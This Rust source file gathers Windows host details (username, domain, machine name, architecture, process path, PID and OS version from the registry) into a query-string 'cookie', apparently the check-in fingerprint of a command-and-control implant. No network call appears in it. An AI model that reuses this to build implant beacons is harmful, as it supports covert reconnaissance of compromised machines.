use winreg::enums::*;
use winreg::RegKey;
use std::io;

pub fn get_cookie() -> String {
    let getUserName = getUserName();
    let getComputerName = getComputerName();
    let getDomain = getDomain();
    let getArch: String = getArch();
    let getProcessName = getProcessName();
    let process_id = get_process_id();

    let session_id = format!(
        "username={}&domain={}&machine={}&process={}&version={}&arch={}&pid={}",
        getUserName, getDomain, getComputerName, getProcessName, get_os_version().unwrap(), getArch, process_id
    );
    session_id
}

fn getUserName() -> String {
    std::env::var("USERNAME").unwrap_or_default()
}

fn getComputerName() -> String {
    std::env::var("COMPUTERNAME").unwrap_or_default()
}

fn getDomain() -> String {
    std::env::var("USERDOMAIN").unwrap_or_default()
}

fn getArch() -> String {
    std::env::var("PROCESSOR_ARCHITECTURE").unwrap_or_default()
}

fn getProcessName() -> String {
    let process_name = std::env::current_exe().unwrap().to_string_lossy().to_string();
    process_name
}

fn get_os_version() -> Result<String, io::Error> {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let cur_ver = hklm.open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")?;
    let product_name: String = cur_ver.get_value("ProductName")?;
    Ok(product_name)
}
fn get_process_id() -> String {
    let process_id = std::process::id();
    process_id.to_string()
}